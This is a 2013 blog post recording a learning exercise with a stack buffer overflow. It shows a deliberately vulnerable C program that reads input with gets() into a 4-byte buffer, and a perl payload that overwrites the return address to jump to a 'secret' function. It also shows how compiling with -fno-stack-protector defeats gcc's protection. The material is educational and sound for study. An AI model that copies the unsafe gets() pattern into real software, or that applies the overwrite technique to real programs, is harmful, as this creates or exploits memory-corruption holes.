---
title: "Day 17: How to write a buffer overflow exploit"
date: 2013-10-28
url: https://jvns.ca/blog/2013/10/28/day-17-buffer-overflows/
slug: day-17-buffer-overflows
word_count: 559
---


I’ve declared this week to be the week of networks & security.


Today I started reading the excellent book
[Hacking: The Art of Exploitation](http://nostarch.com/hacking2.htm)
by Jon Erickson. I learned a lot about how different parts and how MAC address
spoofing actually works.


But! Buffer overflows! I worked with Travis and Daphne today and we made one
work!


Okay. Here is a program with a vulnerability, made extra easy to exploit:


```
#include <stdio.h>
#include <string.h>

char password[] = "super_secret";

void foo(void) {
  printf("You hacked me! Here is the secret password: %s\n", password);
  fflush(stdout);
}

int main(int argc, char *argv[]) {
  char buf[4];

  printf("Here is the address of foo: %p\nWhat is your hacking text? ", foo);
  fflush(stdout);

  gets(buf);

  printf("You entered: %s\n", buf);
  fflush(stdout);

  return 0;
}

```


The idea is that we’re going to put a string, then make the program jump to
the address of `foo` instead of returning. I couldn’t get this to work on my
64-bit machine for some reason, so I told it to be 32-bit instead and it
worked. If you know why please tell me! (*Edit:* Figured this out! Turns out I
just needed to pad the address with 0s until it was 64 bits and then
experiment with offsets.)


```
$ gcc -m32 test.c -o test
$ perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' | ./test
Here is the address of foo: 0x80484b4
What is your hacking text? You entered: aaaa���
*** stack smashing detected ***: ./a.out terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x45)[0xf7663eb5]
/lib/i386-linux-gnu/libc.so.6(+0x104e6a)[0xf7663e6a]
./a.out[0x8048561]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xf75784d3]
./a.out[0x8048421]

```


Oh look! It turns out that gcc already knows about this exploit and has special built-in protections! We can disable those, though…


```
$ gcc -fno-stack-protector -m32 test.c -o test
$ perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' | ./test
Here is the address of foo: 0x8048464
What is your hacking text? You entered: aaaadddd�
You hacked me! Here is the secret password: super_secret
[1]    26357 done                              perl -e 'print "aaaa" . "\x64\x84\x04\x08" x 4' |
 
       26358 segmentation fault (core dumped)  ./a.out

```


BOOM. We win!


What happened here? At the end of the stack, there’s the address that the
function needs to jump back to when it returns. Since `gets` doesn’t know how
many characters to read into buf, it keeps reading into the stack until the
string is over and writes over that address. We don’t know exactly where the
address is, so we keep writing it over and over and over again until it works.


Also! Notice how we had to reverse the order of the memory address to be
`"\x64\x84\x04\x08"` instead of `\x08\x04\x84\x64`. This is because memory is
laid out in a little-endian way. “Little-endian” basically means “backwards”.
Intel architectures are always like this. See [wikipedia](http://en.wikipedia.org/wiki/Endianness) for more on endianness.


There are smarter ways to deal with this issue of not knowing where the end of
the stack is (“NOP sleds”!), but this one is simpler and so it is what we did.


Filippo pointed out to me that NOP sleds are actually something you use in
shellcode when you’re not sure where the program execution will start. In this
case I think you actually just have to figure out where the return address is.
I think you can also use gdb or objdump to discover the layout of the stack,
but I don’t know how to do that yet.
